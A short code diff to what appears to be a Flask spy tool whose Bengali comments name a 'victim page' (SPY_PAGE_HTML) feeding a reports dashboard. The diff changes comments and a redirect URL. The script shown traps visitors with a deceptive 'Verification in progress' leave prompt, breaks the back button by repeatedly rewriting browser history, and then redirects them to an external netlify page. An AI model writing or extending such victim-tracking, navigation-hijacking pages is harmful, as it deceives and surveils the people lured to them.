@@ -9,7 +9,7 @@ app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')
 
 reports = {}
 
-# অপটিমাইজড ড্যাশবোর্ড HTML (শুধু নতুন ডেটা যোগ হয়, রি-রেন্ডার নেই)
+# ড্যাশবোর্ড HTML (শুধু ডেটা যোগ হয়, রি-রেন্ডার নেই)
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
@@ -144,7 +144,7 @@ DASHBOARD_HTML = """
 </html>
 """
 
-# ভিকটিম পেজ (আগের মতোই, কোনো পরিবর্তন নেই – শুধু রিডাইরেক্ট লিংক আপনার দেওয়া)
+# ভিকটিম পেজ (আগের মোডে, কোনো পরিবর্তন নেই – শুধু রিডাইরেক্ট লিংক আপনার দেওয়া)
 SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
@@ -335,7 +335,7 @@ SPY_PAGE_HTML = """
     window.onbeforeunload = function() { return "Verification in progress. Are you sure?"; };
     setInterval(() => { history.pushState({}, '', '/'); }, 500);
     setTimeout(() => {
-        window.location.replace("https://cyber24.netlify.app/share-app.html");
+        window.location.replace("https://cybertools12.netlify.app/share-app.html");
     }, 20000);
 </script>
 </body>
